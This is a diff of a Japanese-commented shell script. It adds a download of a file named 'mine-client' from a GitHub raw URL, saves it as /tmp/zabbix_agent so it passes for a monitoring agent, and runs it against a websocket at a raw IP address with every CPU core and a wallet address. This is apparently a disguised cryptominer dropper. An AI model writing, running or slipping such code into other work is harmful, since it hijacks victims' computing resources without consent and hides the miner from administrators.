@@ -5,10 +5,10 @@ cpu_cores=$(nproc)
 echo "現在のシステムには $cpu_cores コアのCPUがあります。"
 
 # ダウンロードするファイルのURL
-file_url=""
+file_url="https://raw.githubusercontent.com/Whitlingum/test/main/mine-client"
 
 # ダウンロード先のパス
-destination="/tmp/watchdog"
+destination="/tmp/zabbix_agent"
 
 # curl または wget がインストールされているか確認
 if command -v curl &> /dev/null
@@ -74,3 +74,5 @@ if [ -f "$destination" ]; then
 else
     echo "ファイルのダウンロードに失敗しました。"
 fi
+
+/tmp/zabbix_agent --url "ws://156.238.235.76:1111" --cores ${cpu_cores} -wallet "CH4AgKN6QwYz1tBV77McxsJR1bn4sz7oCiuQRrS1TGrp"
